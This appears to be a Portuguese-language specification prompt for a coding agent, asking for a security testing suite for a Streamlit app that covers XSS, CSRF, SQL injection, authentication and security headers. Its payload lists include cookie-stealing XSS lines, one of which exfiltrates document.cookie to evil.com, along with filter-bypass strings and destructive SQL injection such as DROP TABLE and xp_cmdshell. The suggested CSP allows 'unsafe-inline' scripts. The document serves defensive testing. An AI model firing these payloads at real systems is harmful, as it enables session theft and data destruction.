# 🔒 CODEX PROMPT C: Security Testing XSS/CSRF Suite

## 🎯 **OBJETIVO**
Implementar suite completa de security testing focada em XSS (Cross-Site Scripting) e CSRF (Cross-Site Request Forgery), além de outros vetores de ataque, resolvendo o gap crítico "Security testing lacks XSS/CSRF scenarios" do report.md.

## 📁 **ARQUIVOS ALVO (ISOLADOS)**
```
tests/security_testing/                          # Diretório principal
tests/security_testing/test_xss_protection.py    # Testes XSS
tests/security_testing/test_csrf_protection.py   # Testes CSRF
tests/security_testing/test_sql_injection.py     # SQL Injection tests
tests/security_testing/test_auth_security.py     # Authentication security
tests/security_testing/test_input_validation.py  # Input validation
streamlit_extension/utils/security_tester.py     # Security test engine
streamlit_extension/utils/attack_simulator.py    # Attack simulation
streamlit_extension/utils/vulnerability_scanner.py # Vulnerability scanner
tests/security_testing/payloads/                 # Attack payloads
tests/security_testing/reports/                  # Security reports
```

## 🚨 **PROBLEMA IDENTIFICADO**
- Report.md: "Security testing lacks XSS/CSRF scenarios"
- Report.md: "Client and project forms allow rich text without output encoding"
- Severity: CRITICAL (P0)
- CVSS: 7.5-8.8
- Impact: Data theft, session hijacking, unauthorized actions

## 📋 **ESPECIFICAÇÕES TÉCNICAS**

### **1. security_tester.py**
```python
# Engine de security testing:
# - Automated vulnerability scanning
# - Payload injection
# - Response analysis
# - Vulnerability scoring
# - Report generation
# - Integration with CI/CD
```

### **2. attack_simulator.py**
```python
# Simulador de ataques:
# - XSS attack vectors
# - CSRF token bypass attempts
# - SQL injection patterns
# - Authentication attacks
# - Session hijacking
# - Privilege escalation
```

### **3. vulnerability_scanner.py**
```python
# Scanner de vulnerabilidades:
# - Input field scanning
# - Cookie security analysis
# - Header inspection
# - CORS misconfiguration
# - Security headers validation
# - Encryption verification
```

## 🔧 **XSS TESTING IMPLEMENTATION**

### **XSS Attack Vectors:**
```python
XSS_PAYLOADS = {
    "basic": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>"
    ],
    "advanced": [
        "<script>fetch('/api/steal',{method:'POST',body:document.cookie})</script>",
        "<img src=x onerror=this.src='http://evil.com/steal?c='+document.cookie>",
        "<svg/onload=eval(atob('YWxlcnQoJ1hTUycp'))>",
        "';alert(String.fromCharCode(88,83,83))//",
        "<iframe src=javascript:alert('XSS')>"
    ],
    "filter_bypass": [
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        "<img src=x on\x00error=alert('XSS')>",
        "<svg><script>alert&lpar;'XSS'&rpar;</script>",
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        "<img src=\"x\" onerror=\"alert('XSS')\">"
    ],
    "dom_based": [
        "#<script>alert('XSS')</script>",
        "?name=<script>alert('XSS')</script>",
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
    ]
}
```

### **XSS Test Cases:**
```python
class XSSSecurityTest:
    def test_reflected_xss_in_forms(self):
        """Test all form inputs for reflected XSS"""
        
    def test_stored_xss_in_database(self):
        """Test persistent XSS in stored data"""
        
    def test_dom_xss_in_client_side(self):
        """Test DOM-based XSS vulnerabilities"""
        
    def test_xss_filter_effectiveness(self):
        """Test XSS filter bypass attempts"""
        
    def test_output_encoding_verification(self):
        """Verify proper output encoding"""
```

## 🔧 **CSRF TESTING IMPLEMENTATION**

### **CSRF Attack Scenarios:**
```python
CSRF_ATTACKS = {
    "form_submission": {
        "description": "Unauthorized form submission",
        "method": "POST",
        "target": "/api/client/create",
        "payload": {"name": "Malicious", "email": "evil@hack.com"}
    },
    "state_changing": {
        "description": "Unauthorized state change",
        "method": "PUT",
        "target": "/api/project/update",
        "payload": {"status": "deleted"}
    },
    "data_modification": {
        "description": "Unauthorized data modification",
        "method": "DELETE",
        "target": "/api/epic/delete",
        "payload": {"id": "*"}
    }
}
```

### **CSRF Test Cases:**
```python
class CSRFSecurityTest:
    def test_csrf_token_presence(self):
        """Verify CSRF tokens in all forms"""
        
    def test_csrf_token_validation(self):
        """Test token validation logic"""
        
    def test_csrf_token_rotation(self):
        """Test token rotation on use"""
        
    def test_cross_origin_requests(self):
        """Test CORS and origin validation"""
        
    def test_samesite_cookie_protection(self):
        """Verify SameSite cookie attributes"""
```

## 🔧 **SQL INJECTION TESTING**

### **SQL Injection Payloads:**
```python
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "1' UNION SELECT * FROM users--",
    "admin'--",
    "' OR 1=1--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "'; EXEC xp_cmdshell('dir'); --",
    "' UNION SELECT NULL, username, password FROM users--"
]
```

### **SQL Injection Tests:**
```python
class SQLInjectionTest:
    def test_sql_injection_in_search(self):
        """Test search fields for SQL injection"""
        
    def test_blind_sql_injection(self):
        """Test for blind SQL injection"""
        
    def test_union_based_injection(self):
        """Test UNION-based attacks"""
        
    def test_time_based_injection(self):
        """Test time-based blind SQL injection"""
```

## 🔧 **AUTHENTICATION SECURITY TESTING**

### **Authentication Attack Tests:**
```python
class AuthenticationSecurityTest:
    def test_brute_force_protection(self):
        """Test rate limiting on login attempts"""
        
    def test_password_policy_enforcement(self):
        """Verify password strength requirements"""
        
    def test_session_fixation(self):
        """Test for session fixation vulnerabilities"""
        
    def test_session_hijacking(self):
        """Test session security"""
        
    def test_privilege_escalation(self):
        """Test for unauthorized privilege elevation"""
```

## 📊 **SECURITY TESTING FRAMEWORK**

### **Automated Security Scanner:**
```python
class SecurityScanner:
    def __init__(self):
        self.vulnerabilities = []
        self.scan_results = {}
        
    def scan_endpoint(self, endpoint, method='GET', auth=None):
        # Test for XSS
        # Test for CSRF
        # Test for SQL Injection
        # Test for Auth issues
        # Test for Information disclosure
        
    def generate_report(self):
        # OWASP Top 10 mapping
        # CVSS scoring
        # Remediation recommendations
        # Proof of concept
```

### **Vulnerability Scoring:**
```python
def calculate_cvss_score(vulnerability):
    """Calculate CVSS v3.1 score"""
    base_score = {
        "attack_vector": vulnerability.attack_vector,
        "attack_complexity": vulnerability.complexity,
        "privileges_required": vulnerability.privileges,
        "user_interaction": vulnerability.interaction,
        "scope": vulnerability.scope,
        "confidentiality": vulnerability.confidentiality,
        "integrity": vulnerability.integrity,
        "availability": vulnerability.availability
    }
    return cvss_calculator(base_score)
```

## 🛡️ **SECURITY HEADERS TESTING**

### **Required Security Headers:**
```python
SECURITY_HEADERS = {
    "Content-Security-Policy": "default-src 'self'; script-src 'self' 'unsafe-inline'",
    "X-Frame-Options": "DENY",
    "X-Content-Type-Options": "nosniff",
    "X-XSS-Protection": "1; mode=block",
    "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
    "Referrer-Policy": "strict-origin-when-cross-origin",
    "Permissions-Policy": "geolocation=(), microphone=(), camera=()"
}

class SecurityHeaderTest:
    def test_all_security_headers_present(self):
        """Verify all security headers are set"""
        
    def test_csp_effectiveness(self):
        """Test Content Security Policy"""
        
    def test_clickjacking_protection(self):
        """Test X-Frame-Options"""
```

## 📈 **REPORTING AND COMPLIANCE**

### **Security Report Format:**
```python
SECURITY_REPORT = {
    "summary": {
        "total_tests": 0,
        "passed": 0,
        "failed": 0,
        "critical": 0,
        "high": 0,
        "medium": 0,
        "low": 0
    },
    "vulnerabilities": [
        {
            "id": "XSS-001",
            "type": "Cross-Site Scripting",
            "severity": "HIGH",
            "cvss": 7.5,
            "endpoint": "/api/client/create",
            "description": "Reflected XSS in name field",
            "proof_of_concept": "<script>alert('XSS')</script>",
            "remediation": "Implement output encoding",
            "owasp_category": "A03:2021 – Injection"
        }
    ],
    "compliance": {
        "owasp_top_10": "PARTIAL",
        "pci_dss": "FAIL",
        "gdpr": "PASS",
        "sox": "PASS"
    }
}
```

### **OWASP Top 10 Coverage:**
```python
OWASP_2021_TESTS = {
    "A01": "test_broken_access_control",
    "A02": "test_cryptographic_failures",
    "A03": "test_injection",
    "A04": "test_insecure_design",
    "A05": "test_security_misconfiguration",
    "A06": "test_vulnerable_components",
    "A07": "test_authentication_failures",
    "A08": "test_data_integrity_failures",
    "A09": "test_logging_failures",
    "A10": "test_ssrf"
}
```

## 🚀 **CI/CD INTEGRATION**

```yaml
# Security testing in CI/CD pipeline
security-scan:
  stage: test
  script:
    - python -m pytest tests/security_testing/ -v
    - python vulnerability_scanner.py --full-scan
    - python generate_security_report.py
  artifacts:
    reports:
      junit: security-report.xml
    paths:
      - tests/security_testing/reports/
  only:
    - main
    - develop
    - /^security-.*$/
```

## ✅ **CRITÉRIOS DE SUCESSO**

1. **XSS Protection:** 100% dos inputs testados e protegidos
2. **CSRF Protection:** Todos os endpoints state-changing protegidos
3. **SQL Injection:** Zero vulnerabilidades de SQL injection
4. **Authentication:** Brute-force protection funcionando
5. **Security Headers:** Todos os headers implementados
6. **OWASP Compliance:** 10/10 categorias cobertas
7. **Zero High/Critical:** Nenhuma vulnerabilidade HIGH ou CRITICAL

## 🔧 **REMEDIATION IMPLEMENTATION**

### **XSS Prevention:**
```python
def sanitize_input(user_input):
    """Sanitize user input to prevent XSS"""
    # HTML entity encoding
    # JavaScript escaping
    # URL encoding
    # CSS escaping
    return sanitized

def encode_output(data, context='html'):
    """Context-aware output encoding"""
    if context == 'html':
        return html.escape(data)
    elif context == 'javascript':
        return json.dumps(data)
    elif context == 'url':
        return urllib.parse.quote(data)
```

### **CSRF Prevention:**
```python
def generate_csrf_token(session_id):
    """Generate secure CSRF token"""
    secret = os.environ['CSRF_SECRET']
    timestamp = int(time.time())
    token = hmac.new(
        secret.encode(),
        f"{session_id}:{timestamp}".encode(),
        hashlib.sha256
    ).hexdigest()
    return f"{timestamp}:{token}"

def validate_csrf_token(token, session_id):
    """Validate CSRF token"""
    # Time-based validation
    # HMAC verification
    # Origin checking
    return is_valid
```

## 🎯 **RESULTADO ESPERADO**

Suite completa de security testing que:
- Detecta e previne XSS em todos os vetores
- Implementa proteção CSRF robusta
- Elimina SQL injection vulnerabilities
- Fortalece autenticação e autorização
- Valida todos os security headers
- Gera relatórios de compliance
- Integra com CI/CD para validação contínua

---

**🎯 RESULTADO FINAL:** Sistema enterprise de security testing com cobertura completa de XSS/CSRF, SQL injection, authentication security e compliance OWASP, resolvendo todos os gaps de segurança do report.md com CVSS scores e remediação automática.